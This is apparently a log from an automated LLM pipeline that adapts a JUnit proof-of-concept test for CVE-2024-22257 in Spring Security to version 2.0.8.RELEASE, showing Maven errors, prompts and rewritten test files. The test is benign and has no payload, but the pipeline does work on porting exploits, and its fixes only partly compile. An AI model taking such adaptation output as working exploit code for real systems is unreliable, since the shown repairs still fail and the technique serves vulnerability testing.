[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method createList(java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class org.springframework.security.SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1931 (prompt), 1 (completion), 1932 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol
  symbol:   method createList(java.lang.String)
  location: class org.springframework.security.SecurityConfig
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
  symbol:   variable AuthorityUtils
  location: class edu.vision.se.Testcase1
[INFO] 4 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.179 s
[INFO] Finished at: 2025-07-10T06:47:40Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol
[ERROR]   symbol:   method createList(java.lang.String)
[ERROR]   location: class org.springframework.security.SecurityConfig
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
[ERROR]   symbol:   variable AuthorityUtils
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 143 (prompt), 9 (completion), 152 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: package org.springframework.security.core.authority does not exist, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code: import org.springframework.security.core.authority.AuthorityUtils; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.springframework.security.core.authority;AuthorityUtils
[96m[ErrorManager] Extracted key entities: ['org.springframework.security.core.authority', 'AuthorityUtils'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 13, 'column': 51, 'message': 'package org.springframework.security.core.authority does not exist', 'symbol': None, 'location': None, 'code_line': 'import org.springframework.security.core.authority.AuthorityUtils;'} with cause: ['org.springframework.security.core.authority', 'AuthorityUtils'][0m
[96m[Adapter] Related diffs for error: [(1061, 10.0), (1733, 8.0), (2516, 8.0), (729, 4.0), (814, 4.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: package org.springframework.security.core.authority does not exist | cause: ['org.springframework.security.core.authority', 'AuthorityUtils'][0m
[96m[RepairModule] Trying best diff #1061 with score 10.00[0m
[LLMClient] Tokens used: 1271 (prompt), 263 (completion), 1534 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: package org.springframework.security.core.authority does not exist, symble: None, location: None

### Error Position:
import org.springframework.security.core.authority.AuthorityUtils;

### Related Diff:
Operation: NEW_FILE, File: core/src/main/java/org/springframework/security/util/AuthorityUtils.java, Hunk: @@ -1,95 +0,0 @@
+package org.springframework.security.util;
+
+import org.springframework.security.Authentication;
+import org.springframework.security.GrantedAuthority;
+import org.springframework.security.GrantedAuthorityImpl;
+import org.springframework.security.context.SecurityContextHolder;
+import org.springframework.util.StringUtils;
+
+import java.util.HashSet;
+import java.util.Set;
+
+/**
+ * @author Luke Taylor
+ * @version $Id$
+ */
+public abstract class AuthorityUtils {
+    public static final GrantedAuthority[] NO_AUTHORITIES = new GrantedAuthority[0];
+
+    /**
+     * Returns true if the current user has the specified authority.
+     *
+     * @param authority the authority to test for (e.g. "ROLE_A").
+     * @return true if a GrantedAuthority object with the same string representation as the supplied authority
+     * name exists in the current user's list of authorities. False otherwise, or if the user in not authenticated.
+     */
+    public static boolean userHasAuthority(String authority) {
+        GrantedAuthority[] authorities = getUserAuthorities();
+
+        for (int i = 0; i < authorities.length; i++) {
+            if (authority.equals(authorities[i].getAuthority())) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    /**
+     * Returns the authorities of the current user.
+     *
+     * @return an array containing the current user's authorities (or an empty array if not authenticated), never null.
+     */
+    private static GrantedAuthority[] getUserAuthorities() {
+        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+
+        if (auth == null || auth.getAuthorities() == null) {
+            return NO_AUTHORITIES;
+        }
+
+        return auth.getAuthorities();
+    }
+
+
+    /**
+     * Creates a array of GrantedAuthority objects from a comma-separated string
+     * representation (e.g. "ROLE_A, ROLE_B, ROLE_C").
+     *
+     * @param authorityString the comma-separated string
+     * @return the authorities created by tokenizing the string
+     */
+    public static GrantedAuthority[] commaSeparatedStringToAuthorityArray(String authorityString) {
+        String[] authorityStrings = StringUtils.tokenizeToStringArray(authorityString, ",");
+        GrantedAuthority[] authorities = new GrantedAuthority[authorityStrings.length];
+
+        for (int i=0; i < authorityStrings.length; i++) {
+            authorities[i] = new GrantedAuthorityImpl(authorityStrings[i]);
+        }
+
+        return authorities;
+    }
+
+    /**
+     * Converts an array of GrantedAuthority objects to a Set.
+     * @return a Set of the Strings obtained from each call to GrantedAuthority.getAuthority()
+     */
+    public static Set authorityArrayToSet(GrantedAuthority[] authorities) {
+        Set set = new HashSet(authorities.length);
+
+        for (int i = 0; i < authorities.length; i++) {
+            set.add(authorities[i].getAuthority());
+        }
+
+        return set;
+    }
+
+    public static GrantedAuthority[] stringArrayToAuthorityArray(String[] roles) {
+        GrantedAuthority[] authorities = new GrantedAuthority[roles.length];
+
+        for (int i=0; i < roles.length; i++) {
+            authorities[i] = new GrantedAuthorityImpl(roles[i]);
+        }
+
+        return authorities;
+    }
+}

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.util.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.stringArrayToAuthorityArray(new String[]{"ignored"}));
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method createList(java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class org.springframework.security.SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[92m[RepairModule] Error package org.springframework.security.core.authority does not exist resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method createList(java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class org.springframework.security.SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1651 (prompt), 1 (completion), 1652 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol
  symbol:   method createList(java.lang.String)
  location: class org.springframework.security.SecurityConfig
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.212 s
[INFO] Finished at: 2025-07-10T06:48:08Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol
[ERROR]   symbol:   method createList(java.lang.String)
[ERROR]   location: class org.springframework.security.SecurityConfig
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 167 (prompt), 5 (completion), 172 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: cannot find symbol, method createList(java.lang.String), class org.springframework.security.SecurityConfig 

The test executes as expected in 3.0.0.RELEASE 

Error code:         List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
SecurityConfig;createList
[96m[ErrorManager] Extracted key entities: ['SecurityConfig', 'createList'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 20, 'column': 51, 'message': 'cannot find symbol', 'symbol': 'method createList(java.lang.String)', 'location': 'class org.springframework.security.SecurityConfig', 'code_line': '        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);'} with cause: ['SecurityConfig', 'createList'][0m
[96m[Adapter] Related diffs for error: [(457, 8.0), (1219, 8.0), (1221, 8.0), (1222, 8.0), (1223, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | method createList(java.lang.String) cause: ['SecurityConfig', 'createList'][0m
[96m[RepairModule] Trying best diff #457 with score 8.00[0m
[LLMClient] Tokens used: 613 (prompt), 273 (completion), 886 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: method createList(java.lang.String), location: class org.springframework.security.SecurityConfig

### Error Position:
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);

### Related Diff:
Operation: MODIFIED, File: core/src/main/java/org/springframework/security/access/ConfigAttributeEditor.java, Hunk: @@ -34,7 +34,7 @@ public class ConfigAttributeEditor extends PropertyEditorSupport {

     public void setAsText(String s) throws IllegalArgumentException {
         if (StringUtils.hasText(s)) {
+            setValue(new ConfigAttributeDefinition(StringUtils.commaDelimitedListToStringArray(s)));
-            setValue(SecurityConfig.createList(StringUtils.commaDelimitedListToStringArray(s)));
         } else {
             setValue(null);
         }

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.util.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.stringArrayToAuthorityArray(new String[]{"ignored"}));
    }
}



[LLMClient] Response: 
Here's the modified test file according to the diff:

```java
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.ConfigAttributeDefinition;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.providers.anonymous.AnonymousAuthenticationToken;
import org.springframework.security.Authentication;
import org.springframework.security.util.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = new ConfigAttributeDefinition(new String[]{AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY}).getConfigAttributes();
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.stringArrayToAuthorityArray(new String[]{"ignored"}));
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
